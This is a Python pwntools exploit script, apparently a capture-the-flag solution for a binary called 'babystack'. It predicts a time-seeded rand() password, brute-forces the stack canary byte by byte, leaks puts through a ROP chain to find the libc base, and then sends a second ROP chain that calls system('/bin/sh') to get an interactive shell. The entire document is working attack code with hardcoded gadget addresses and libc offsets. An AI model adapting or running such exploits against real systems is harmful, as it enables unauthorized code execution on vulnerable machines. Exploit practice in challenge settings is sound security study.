from pwn import *
import time
from ctypes import CDLL

def login(name,password):
	r.sendline('1')
	r.recvuntil('Username: ')
	r.send(name)
	r.recvuntil('Password: ')
	r.send(password)
	return r.recvuntil("Your choice: ")

r = process("babystack")
proc = CDLL("libc.so.6")
proc.srand(proc.time(0))
password = ''
canary = '\x00'

pop_rdi_ret = 0x400f03 
puts_got = 0x601F70 
puts_plt = 0x4008C0
play = 0x0400D70
offset_puts = 0x6f690
offset_str_bin_sh = 0x18cd57
offset_system = 0x45390

for i in range(24):
	password  += chr(int('0x'+str(hex(proc.rand()))[-2:],16))
r.recvuntil("Your choice: ")
for j in range(7):
	for i in range(1,256):
		msg = login('admin\x00',password+canary+chr(i))
		if "Logged" in msg:
			canary += chr(i)			
			break
canary = u64(canary)
r.sendline('2')
payload = 'A'*40
payload += p64(canary)
payload += 'B'*8
payload +=  p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(play)
r.recvuntil('Content: ')
r.sendline(payload)
puts = u64(r.recvuntil('Content: ').split("\n")[1]+"\x00\x00")
libc = puts - offset_puts
system = libc + offset_system
sh = libc + offset_str_bin_sh
log.info("puts: %#x",puts)
log.info("libc: %#x",libc)
log.info("system: %#x",system)
log.info("sh: %#x",sh)
payload = 'A'*40
payload += p64(canary)
payload += 'B'*8
payload +=  p64(pop_rdi_ret)
payload += p64(sh)
payload += p64(system)
r.sendline(payload)
r.interactive()